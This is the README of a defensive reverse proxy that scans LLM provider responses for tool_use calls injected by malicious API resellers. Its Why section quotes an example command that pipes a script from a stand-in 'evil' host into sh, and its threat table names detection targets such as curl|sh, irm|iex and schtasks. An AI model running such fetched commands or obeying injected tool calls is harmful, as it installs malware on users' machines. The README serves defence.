# carapace — `cape`

**A local guard against malicious LLM providers — on the wire, not in your client.**

> Work in progress. v0.1.0 ships the inspecting reverse proxy with the safety
> properties listed below. The four-command surface (`proxy | scan | audit |
> sentinel`) is wired; `scan`, `audit`, `sentinel` are placeholders until the
> next milestone.

---

## Why

Cheap API resellers ("grey tokens") are a known malware channel. A malicious
upstream speaks normal Anthropic / OpenAI protocol but **injects `tool_use`
calls into its own response** — and your AI client (Claude Code, Cline, Cursor,
Aider…) happily runs `curl https://evil/main.ps1 | sh`, installs a
scheduler task, routes your traffic through a SOCKS5 proxy, wipes logs.

`cape` sits **between** your client and the upstream so it works with any
client that lets you override the base URL — no per-client plugin, no custom
builds.

```
   AI client                                    real LLM provider
     │                                            ▲
     └──►  carapace (inspect, reassemble, block) ─┘
                │
                └──►  alert + JSONL log
```

## Threat model — what `cape` catches (and what it cannot)

| Threat                                  | v0.1.0 | Note |
| --------------------------------------- | :----: | ---- |
| `tool_use` injected by the provider     | ✅     | Treated as unsolicited unless your request declared the tool. |
| `curl | sh`, `irm | iex`, `schtasks`, … | ✅     | Behavioural RE2 rules over the reassembled stream. |
| Known IoC domains / hosts               | ✅     | Built-in blocklist, overridable at runtime. |
| Chunked obfuscation of `tool_use` input | ✅     | Stream is reassembled before scanning (the core safety property). |
| Passive prompt exfiltration             | ❌     | Structural — do not send secrets to unverified endpoints. Rotate keys after接触 with one. |
| Malware inside a downloaded model file  | ❌     | Use ModelScan for that; carapace is a *wire* guard, not a file scanner. |

## Distinct from `holone`

| Capability | holone | carapace v0.1.0 |
|---|---|---|
| Memory-safe key handling | plain env | `zeroize::Secret`, wiped on drop |
| Reassembly before scan   | per-chunk | full-buffer reassembly first |
| Unsolicited tool_use     | ✅ | ✅ + allowed-tool allowlist per request |
| Default mode             | monitor | **block** (alerts alone are useless) |
| Protocol adapters        | hardcoded Anthropic/OpenAI | `ProtocolAdapter` trait (z.ai + DeepSeek planned) |

## Install

```sh
# from source
cargo install --path .

# then run
cape proxy --upstream https://api.anthropic.com
```

## Use

```sh
# 1) stand carapace up before your real provider
cape proxy --upstream https://api.anthropic.com --upstream-key "$ANTHROPIC_API_KEY"

# 2) point your client at carapace
export ANTHROPIC_BASE_URL=http://127.0.0.1:8787

# 3) work as usual. carapace logs alerts to stderr and ~/.carapace/carapace.log
```

| Client | How to point |
| --- | --- |
| Claude Code | `export ANTHROPIC_BASE_URL=http://127.0.0.1:8787` or `~/.claude/settings.json` |
| Cline / Roo / Kilo Code | base URL → `http://127.0.0.1:8787` |
| Cursor | Settings → Models → override Anthropic/OpenAI base URL |
| Aider | `--openai-api-base http://127.0.0.1:8787` |

## Roadmap

- **v0.1.0** (this commit): inspecting reverse proxy, builtin rules + blocklist, `block` default.
- **v0.2.0**: incremental SSE reassembly via `tokio::Stream` (chunk-aware, zero-copy `Bytes`).
- **v0.3.0**: Anthropic + OpenAI protocol adapters (token-level decode, not raw scan).
- **v0.4.0**: optional LLM-judge slow-path for suspicious-but-non-matching `tool_use`.
- **v0.5.0**: `cape scan` canary probe + signed threat-feed updates.
- **v0.6.0**: `cape audit` host IoC scanner for known campaigns (Windows/POSIX).
- `cape sentinel` background monitor, encrypted forensics recording, MCP-style
  protocol adapters.

## Disclaimer

`carapace` is harm reduction, not a guarantee. It reduces but does not eliminate
risk of routing traffic through an untrusted LLM provider. The only safe option
is the official endpoint. If you used an unofficial provider before, **rotate
your API key now** — passive exfiltration cannot be detected on the wire.

## License

MIT, see [LICENSE](LICENSE).